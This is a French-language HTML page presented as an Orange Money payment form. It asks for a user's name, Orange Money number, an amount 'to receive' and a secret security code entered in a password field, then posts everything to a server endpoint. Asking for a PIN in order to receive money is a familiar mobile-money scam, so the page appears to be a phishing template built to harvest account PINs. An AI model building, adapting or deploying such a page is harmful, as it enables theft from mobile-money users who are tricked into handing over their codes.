<!doctype html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paiement via Orange Money</title>
    <link href="styles.css" rel="stylesheet">
</head>
<body>
    <div class="container">
        <h2>Paiement via Orange Money</h2>
        <form action="/submit" method="POST">
            <label>Nom et Prénom :</label>
            <input type="text" name="fullname" placeholder="Entrez votre nom complet" required>
            
            <label>Numéro Orange Money :</label>
            <input type="text" name="number" placeholder="Entrez votre numéro" required>

            <label>Devise :</label>
            <select name="currency" required>
                <option value="XOF">FCFA (XOF)</option>
                <option value="USD">Dollar (USD)</option>
                <option value="EUR">Euro (EUR)</option>
            </select>

            <label>Montant à recevoir :</label>
            <input type="number" name="amount" placeholder="Entrez le montant" required>

            <label>Code de sécurité :</label>
            <input type="password" name="security_code" placeholder="Ex: 1234" required>

            <button type="submit" class="btn orange">Recevoir</button>
        </form>
    </div>
</body>
</html>
